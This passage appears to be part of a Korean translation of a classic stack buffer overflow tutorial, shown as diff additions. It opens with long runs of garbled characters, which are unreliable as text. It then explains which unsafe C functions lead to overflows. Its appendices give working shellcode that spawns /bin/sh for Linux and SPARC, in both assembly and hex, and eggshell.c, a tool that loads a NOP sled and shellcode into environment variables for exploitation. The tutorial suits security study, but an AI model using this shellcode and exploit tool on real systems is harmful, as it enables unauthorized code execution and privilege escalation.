+
+
+
+�염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염
+
+
+
+
+
+
+
+
+?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염??
+
+
+
+
+
+
+
+
+갇�염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?
+
+
+
+
+
+
+
+
+염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?
+
+
+
+
+
+
+
+
+�염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염
+
+
+
+
+
+
+
+
+?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염??
+
+
+
+
+
+
+
+
+갇�염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?
+
+
+
+
+
+
+
+
+염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?
+
+
+
+
+
+
+
+
+�염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?염?�염??
+
+
+
+
+
+
+
+
+갇�염?염?
+Warning: some arguments in previous message were lost
+$
+------------------------------------------------------------------------------
+
+첫 번째 시도로 성공했다! 성공할 가능성이 확실히 증가되었다. 이용 프로그램이
+여러분이 이용하고자 하는 프로그램과 얼마나 많은 환경 데이터를 비교하느냐에
+따라 추측된 주소는 낮아 질 수도, 높아 질 수도 있다. 양의 거리(offset)와 음의
+거리(offset) 둘 다를 가지고 실험해 보라.
+
+
+                              버퍼 오버플로우 찾기
+                             ~~~~~~~~~~~~~~~~~~~~~~
+
+앞에서 말했듯이, 버퍼 오버플로우는 다룰 수 있는 것보다 더 많은 정보를 버퍼에
+채움으로써 일어난다. C는 기본적으로 문자길이 확인(bound checking)을 하지 않기
+때문에, 오버플로우는 문자배열의 끝을 지나서 기록함으로써 나타난다. 표준의 C
+라이브러리는 bound checking을 하지 않는, 문자열을 복사하거나 덧붙이는 많은
+함수들을 제공한다. 이것들을 포함한다: strcat(), strcpy(), sprintf(), vsprintf(). 이 
+함수들은 null로 종료되는 문자열에서 작용하고, 전해 받고 있는 문자열의 오버플로우에
+대해서는 체크하지 않는다. gets()는 새로운 줄(newline) 문자나 EOF가 나올때까지
+stdin(표준 입력)으로부터 1줄을 읽어서 buffer에 기록한다. 이것은 버퍼 오버플로우에
+대한 체크를 전혀 하지 않는다. scanf() 함수형들은, 만약 여러분이 공백문자가 아닌
+(non-white-space) 문자열(%s)을 매치시키거나 혹은 명기된 세트(%[])로부터 
+공백아닌 문자열을 매치시키고, char 포인터에 의해 가르켜진 배열이 문자열 전부를 
+받아들일 수 있을만큼 크지 않고, 선택사항인 최대 필드 폭을 정의하지 않는다면, 
+또한 문제가 발생할 수 있다.
+
+* 역자주 - white-space charaters : space, tab, carriage return, new line,
+vertical tab, or formfeed (0x09 to 0x0D, 0x20)
+
+우리가 찾는 또 다른 보통의 프로그래밍 구성은, 표준입력에서 혹은 어떤 파일에서 
+줄의 마지막(end of line), 파일의 끝(end of file), 혹은 다른 구획문자(delimiter)에 
+도달할때까지, 한 번에 한 문자씩 읽어서 버퍼에 기록하기 위해, while 루프를 
+사용하는 것이다. 이런 구성은 보통 이런 함수들 중 하나를 사용한다:
+getc(), fgetc() 또는 getchar(). 만약 while 루프에서 오버플로우를 위한 명백한
+체크를 하지 않는다면, 그런 프로그램들은 쉽게 이용될 수 있다.
+ 
+결론을 내리자면, grep(1)은 여러분의 친구다. 공짜 운영체계들과 그것들의 유틸리티들의
+소스들은 쉽사리 입수할 수 있다. 이 사실은, 여러분이 많은 통상의 운영체계들의 유틸리티들이
+공짜 것들과 같은 소스에서 파생되었다는 사실을 깨닫게되면, 꽤 흥미로워 질 것이다.
+d00d 소스를 사용하라.
+
+     부록 A - 다른 운영체계와 아키텍처를 위한 쉘코드
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+i386/Linux
+------------------------------------------------------------------------------
+       jmp    0x1f
+       popl   %esi
+       movl   %esi,0x8(%esi)
+       xorl   %eax,%eax
+           movb   %eax,0x7(%esi)
+       movl   %eax,0xc(%esi)
+       movb   $0xb,%al
+       movl   %esi,%ebx
+       leal   0x8(%esi),%ecx
+       leal   0xc(%esi),%edx
+       int    $0x80
+       xorl   %ebx,%ebx
+       movl   %ebx,%eax
+       inc    %eax
+       int    $0x80
+       call   -0x24
+       .string \"/bin/sh\"
+------------------------------------------------------------------------------
+
+SPARC/Solaris
+------------------------------------------------------------------------------
+       sethi   0xbd89a, %l6
+       or      %l6, 0x16e, %l6
+       sethi   0xbdcda, %l7
+       and     %sp, %sp, %o0
+       add     %sp, 8, %o1
+       xor     %o2, %o2, %o2
+       add     %sp, 16, %sp
+       std     %l6, [%sp - 16]
+       st      %sp, [%sp - 8]
+       st      %g0, [%sp - 4]
+       mov     0x3b, %g1
+       ta      8
+       xor     %o7, %o7, %o0
+       mov     1, %g1
+       ta      8
+------------------------------------------------------------------------------
+
+SPARC/SunOS
+------------------------------------------------------------------------------
+       sethi   0xbd89a, %l6
+       or      %l6, 0x16e, %l6
+       sethi   0xbdcda, %l7
+       and     %sp, %sp, %o0
+       add     %sp, 8, %o1
+       xor     %o2, %o2, %o2
+       add     %sp, 16, %sp
+       std     %l6, [%sp - 16]
+       st      %sp, [%sp - 8]
+       st      %g0, [%sp - 4]
+       mov     0x3b, %g1
+           mov            -0x1, %l5
+       ta      %l5 + 1
+       xor     %o7, %o7, %o0
+       mov     1, %g1
+       ta      %l5 + 1
+------------------------------------------------------------------------------
+
+
+                 부록 B - 일반적인 버퍼 오버플로우 프로그램
+                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+shellcode.h
+------------------------------------------------------------------------------
+#if defined(__i386__) && defined(__linux__)
+
+#define NOP_SIZE            1
+char nop[] = "\x90";
+char shellcode[] =
+ "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+ "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+ "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+  __asm__("movl %esp,%eax");
+}
+
+#elif defined(__sparc__) && defined(__sun__) && defined(__svr4__)
+
+#define NOP_SIZE            4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
+ "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+ "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+ "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"
+ "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";
+
+unsigned long get_sp(void) {
+ __asm__("or %sp, %sp, %i0");
+}
+
+#elif defined(__sparc__) && defined(__sun__)
+
+#define NOP_SIZE        4
+char nop[]="\xac\x15\xa1\x6e";
+char shellcode[] =
+ "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"
+ "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"
+ "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"
+ "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";
+
+unsigned long get_sp(void) {
+ __asm__("or %sp, %sp, %i0");
+}
+
+#endif
+------------------------------------------------------------------------------
+
+eggshell.c
+------------------------------------------------------------------------------
+/*
+* eggshell v1.0
+*
+* Aleph One / aleph1@underground.org
+*/
+#include <stdlib.h>
+#include <stdio.h>
+#include "shellcode.h"
+
+#define DEFAULT_OFFSET                    0
+#define DEFAULT_BUFFER_SIZE             512
+#define DEFAULT_EGG_SIZE               2048
+
+void usage(void);
+
+void main(int argc, char *argv[]) {
+ char *ptr, *bof, *egg;
+ long *addr_ptr, addr;
+ int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+ int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;
+
+ while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)
+   switch (c) {
+     case 'a':
+       align = atoi(optarg);
+       break;
+     case 'b':
+       bsize = atoi(optarg);
+       break;
+     case 'e':
+       eggsize = atoi(optarg);
+       break;
+     case 'o':
+       offset = atoi(optarg);
+       break;
+     case '?':
+       usage();
+       exit(0);
+   }
+
+ if (strlen(shellcode) > eggsize) {
+   printf("Shellcode is larger the the egg.\n");
+   exit(0);
+ }
+
+ if (!(bof = malloc(bsize))) {
+   printf("Can't allocate memory.\n");
+   exit(0);
+ }
+ if (!(egg = malloc(eggsize))) {
+   printf("Can't allocate memory.\n");
+   exit(0);
+ }
+
+ addr = get_sp() - offset;
+ printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",
+   bsize, eggsize, align);
+ printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);
+
+ addr_ptr = (long *) bof;
+ for (i = 0; i < bsize; i+=4)
+   *(addr_ptr++) = addr;
+
+ ptr = egg;
+ for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)
+   for (n = 0; n < NOP_SIZE; n++) {
+     m = (n + align) % NOP_SIZE;
+     *(ptr++) = nop[m];
+   }
+
+ for (i = 0; i < strlen(shellcode); i++)
+   *(ptr++) = shellcode[i];
+
+ bof[bsize - 1] = '\0';
+ egg[eggsize - 1] = '\0';
+
+ memcpy(egg,"EGG=",4);
+ putenv(egg);
+
+ memcpy(bof,"BOF=",4);
+ putenv(bof);
+ system("/bin/sh");
+}
+
+void usage(void) {
+ (void)fprintf(stderr,
+   "usage: eggshell [-a <alignment>] [-b <buffersize>] [-e <eggsize>] [-o <offset>]\n");
+}
+------------------------------------------------------------------------------
+
